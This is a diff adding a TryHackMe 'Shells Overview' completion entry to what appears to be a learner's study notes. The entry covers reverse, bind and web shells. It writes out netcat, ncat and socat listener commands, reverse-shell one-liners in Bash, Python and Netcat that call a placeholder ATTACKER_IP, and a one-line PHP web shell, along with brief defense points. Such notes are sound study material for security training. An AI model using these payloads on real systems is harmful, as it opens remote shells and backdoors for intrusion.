@@ -1342,3 +1342,86 @@ Defense strategies against enumeration attacks
 Log monitoring for reconnaissance detection
 
 Part of TryHackMe's Cyber Security 101 Path 
+
+# Shells Overview - Remote Access Techniques | TryHackMe Completion
+## Completion Date: [2025/10/03]
+## 🎯 Module Overview
+Completion of the Shells Overview module covering remote access techniques including reverse shells, bind shells, and web shells.
+
+## 🔧 Skills Acquired
+
+### Shell Types Mastered
+- **Reverse Shells**: Initial connections from compromised systems to attacker machines
+- **Bind Shells**: Listening services on target systems awaiting connections
+- **Web Shells**: Web-based scripts for command execution on compromised servers
+
+### Advanced Listener Tools
+```bash
+# RLwrap with history and editing
+rlwrap nc -lvnp 443
+
+# Ncat with SSL encryption
+ncat --ssl -lvnp 443
+
+# Socat for complex connections
+socat -d -d TCP-LISTEN:443 STDOUT
+Multi-Language Payloads
+Bash:
+
+bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+Python:
+
+python
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+PHP:
+
+php
+<?php system($_GET['cmd']); ?>
+Netcat:
+
+bash
+nc -e /bin/bash ATTACKER_IP 443
+Web Shells Implementation
+p0wny-shell: Minimalist PHP web shell
+
+b374k shell: Advanced PHP web shell with file management
+
+Custom web shell deployment techniques
+
+Upload vulnerabilities exploitation
+
+🎯 Key Competencies
+Technical Understanding
+Difference between reverse and bind shells
+
+Firewall evasion techniques
+
+Payload selection based on target environment
+
+Connection persistence strategies
+
+Detection avoidance methods
+
+Practical Application
+Establishing remote access in penetration tests
+
+Maintaining access to compromised systems
+
+Network pivoting from initial access points
+
+Web application backdoor deployment
+
+Post-exploitation activities
+
+🛡️ Defense Insights
+Monitoring for suspicious shell activity
+
+Detecting web shell deployments
+
+Network traffic analysis for reverse shells
+
+Service monitoring for bind shells
+
+File integrity monitoring for web shells
+
